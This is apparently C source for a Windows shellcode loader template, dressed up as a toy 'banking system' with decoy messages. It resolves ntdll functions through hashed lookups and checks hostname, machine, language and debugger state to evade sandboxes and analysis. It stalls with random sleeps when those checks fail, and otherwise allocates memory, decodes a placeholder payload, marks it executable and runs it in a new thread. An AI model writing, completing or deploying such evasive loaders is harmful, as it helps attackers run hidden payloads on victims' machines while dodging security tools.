#include "definitions.h"

#define RANDOM_VAL (__TIME__[3] * __TIME__[6])

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

    srand(time(NULL));
    uint16_t key = %XOR_KEY%;
    char path[MAX_PATH]; 
    int min = 3000;
    int max = 15000;
    int range = max - min + 1;
    int money =  min + (int)(rand() / (double)RAND_MAX * range) + RANDOM_VAL;
    int money_spent = 0;
    
    
    // snprintf(path, MAX_PATH, "%s\\Documents\\market.txt", getenv("USERPROFILE"));  
    // printf("start");    
    HMODULE hNtdll = CustomGetModuleHandle(NTDLL_HASH);
    HMODULE hKernel32dll = NULL;
    // FILE *file = fopen(path, "w");

    
    if (!is_being_debugged()) {
        // printf("Error during file openning : %s\n", path);
        return 1;
    } else {
        hKernel32dll = CustomGetModuleHandle(KERNEL32_HASH);
    }
    
    const char* hostname = get_hostname(hKernel32dll);
    if (key > 0 && is_valid_hostname(hostname)) {
        // fprintf(file, "You have a key, which is : %s\n", hostname);
    } else {
        money_spent += multiply(money, 3);
        // fprintf(file, "You don't have a key, your's is : %s and money=%d\n", hostname,money_spent);
    }
    
    // fprintf(file, "Hey, welcoming to the banking system !\n");

    if (is_valid_computer(hKernel32dll) && money > 1000) {
        // fprintf(file, "You have enough money !!! %d is plenty\n", money);
    } else {
        money_spent += divide(money, 2);
        // fprintf(file, "You don't have enough money: %de !!!\n",money);
    }
    

    // fprintf(file, "Let's check your curency system\n");

    if (!is_valid_language(hKernel32dll)) {
        money_spent += add(money, 500);
    }

    // Other checks todo

    
    if (money_spent) {
        int min_delay = 300;
        int max_delay = 800;
        int delay;
        // fprintf(file, "Transaction is starting ...\n");
        for (int i = 0; i < 100; i+=12) {
            // fprintf(file, "Transaction in progress (%d%%), please wait ...\n", i);
            delay = min_delay + (int)(rand() / (double)RAND_MAX * (max_delay - min_delay));
            Sleep(delay);
        }
        // fprintf(file , "Transaction in progress (100%%), please wait ...\n");
        // fprintf(file, "Transaction completed, you sent 1 peso to Elon Musk\n");
        // fprintf(file, "Bank is closed, we hope to see you soon !\n");
        // fclose(file);
    } else {
        SIZE_T regionSize = sizeof(payload);
        PVOID exec = NULL;
        DWORD old_protect = 0;
        HANDLE th;
        BOOL rv;
        
        // fprintf(file, "You have a nice account ! Let's get the transaction done !\n");
        // fclose(file);

        NtAllocVirtMem _NtAlocVirtMem = (NtAllocVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_ALLOC_HASH);
        NtWriteVirtMem _NtWriteVirtMem = (NtWriteVirtMem)CustomGetProcAdress(hNtdll, WRITE_MEMORY_HASH);
        NtProtectVirtMem _NtProtectVirtMem = (NtProtectVirtMem)CustomGetProcAdress(hNtdll, VIRTUAL_PROTECT_HASH);
        NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)CustomGetProcAdress(hNtdll, CREATE_THREAD_HASH);
        NtWaitForSingleObj _NtWaitForSingleObj = (NtWaitForSingleObj)CustomGetProcAdress(hNtdll, WAIT_FOR_SINGLE_OBJECT_HASH);
        
        // Allocating executable memory
        _NtAlocVirtMem((HANDLE)-1, &exec, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        %SHELLCODE_DECODER%
        
        // Copy shellcode into allocated memory
        _NtWriteVirtMem((HANDLE)-1, exec, payload, sizeof(payload), NULL);
        
        // Changing memory protection to PAGE_EXECUTE_READ
        _NtProtectVirtMem((HANDLE)-1, &exec, &regionSize, PAGE_EXECUTE_READ, &old_protect);
        
        // Executing shellcode in a new thread
        _NtCreateThreadEx(&th, GENERIC_ALL, NULL, (HANDLE)-1, exec, NULL, false, (ULONG_PTR)NULL, (SIZE_T)NULL, (SIZE_T)NULL, NULL);
        
        // Waiting for thread to finish
        _NtWaitForSingleObj(th, false, NULL);
    }

    return 0;
}
